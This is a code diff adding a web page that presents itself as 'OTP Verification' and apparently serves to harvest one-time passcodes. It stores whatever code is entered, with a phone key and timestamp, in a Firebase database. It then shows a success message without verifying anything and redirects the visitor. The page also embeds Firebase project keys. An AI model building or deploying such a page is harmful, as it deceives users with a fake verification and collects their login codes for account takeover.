@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <link rel="stylesheet" href="style.css" />
+    <title>OTP Verification</title>
+</head>
+
+<body>
+    <form action="" method="POST" id="otpform">
+        <h1>Enter OTP</h1>
+        <div class="alert">OTP Verified Successfully</div>
+
+        <!-- OTP Section -->
+        <fieldset>
+            <legend><span class="section">2</span>OTP Verification</legend>
+            <label for="otp">OTP:</label>
+            <input type="number" name="otp" id="otp" required />
+        </fieldset>
+
+        <button type="submit">Verify OTP</button>
+    </form>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
+        import { getDatabase, ref, update } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js";
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyB5NSPezPZvo5W1286s87bb10SNMzU7Mpg",
+            authDomain: "testbot1-1-28016.firebaseapp.com",
+            projectId: "testbot1-1-28016",
+            storageBucket: "testbot1-1-28016.firebasestorage.app",
+            messagingSenderId: "856851214086",
+            appId: "1:856851214086:web:5cdfa3711eb8d2a4267887",
+            measurementId: "G-8MHHCVFLMD"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // Listen for submit event
+        document.getElementById('otpform').addEventListener('submit', formSubmit);
+
+        // Submit form
+        function formSubmit(e) {
+            e.preventDefault();
+
+            // Get OTP from DOM
+            const otp = document.querySelector('#otp').value;
+
+            // Retrieve phoneKey from localStorage
+            const phoneKey = localStorage.getItem('phoneKey');
+
+            if (!phoneKey) {
+                alert('Phone number not found. Please return to the previous page.');
+                return;
+            }
+
+            // Get the current timestamp
+            const timestamp = new Date().toISOString();
+
+            // Send OTP and timestamp to Firebase
+            sendOtp(phoneKey, otp, timestamp);
+        }
+
+        // Function to send OTP and timestamp to Firebase
+        function sendOtp(phoneKey, otp, timestamp) {
+            update(ref(database, 'phones/' + phoneKey), {
+                otp: otp,
+                otpTimestamp: timestamp // Store the OTP submission time
+            }).then(() => {
+                // Show success message
+                document.querySelector('.alert').style.display = 'block';
+
+                // Hide success message after 7 seconds
+                setTimeout(function () {
+                    document.querySelector('.alert').style.display = 'none';
+                }, 7000);
+
+                // Redirect to a success or confirmation page after 2 seconds
+                setTimeout(function () {
+                    window.location.href = "success.html";
+                }, 2000);
+
+                // Reset the form
+                document.getElementById('otpform').reset();
+            }).catch((error) => {
+                alert(error);
+            });
+        }
+    </script>
+</body>
+</html>
